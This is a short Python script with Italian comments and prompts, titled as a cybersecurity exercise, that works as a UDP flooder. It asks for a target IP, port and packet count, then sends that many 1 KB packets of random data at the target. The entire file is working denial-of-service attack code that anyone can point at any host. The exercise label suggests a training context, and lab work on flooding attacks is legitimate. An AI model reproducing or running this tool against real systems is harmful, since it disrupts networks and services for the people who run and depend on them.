import socket
import random
import sys

# ====================== CONFIGURAZIONE ======================
print("=== UDP Flooder - Esercizio Cybersecurity ===\n")

# Input utente
target_ip = input("Inserisci l'IP della macchina target: ").strip()

try:
    target_port = int(input("Inserisci la porta UDP target: "))
    if not 1 <= target_port <= 65535:
        print("Errore: la porta deve essere tra 1 e 65535")
        sys.exit(1)
except ValueError:
    print("Errore: inserisci un numero valido per la porta")
    sys.exit(1)

try:
    num_packets = int(input("Quanti pacchetti da 1KB vuoi inviare? "))
    if num_packets < 1:
        print("Errore: il numero deve essere almeno 1")
        sys.exit(1)
except ValueError:
    print("Errore: inserisci un numero valido")
    sys.exit(1)

packet_size = 1024  # 1 KB

print(f"\nAvvio flood verso {target_ip}:{target_port}")
print(f"Pacchetti da inviare: {num_packets} × {packet_size} bytes\n")
# ============================================================

# Creazione del socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

sent = 0

try:
    for i in range(num_packets):
        # Generazione di 1KB di dati casuali
        data = random.randbytes(packet_size)
        
        # Invio del pacchetto
        sock.sendto(data, (target_ip, target_port))
        
        sent += 1
        
        # Progress ogni 1000 pacchetti (per non appesantire troppo la console)
        if sent % 1000 == 0:
            print(f"Inviati {sent}/{num_packets} pacchetti...")

except KeyboardInterrupt:
    print("\n\nFlood interrotto dall'utente.")
except Exception as e:
    print(f"\nErrore durante l'invio: {e}")

finally:
    sock.close()
    print(f"\nFlood terminato. Pacchetti inviati: {sent}")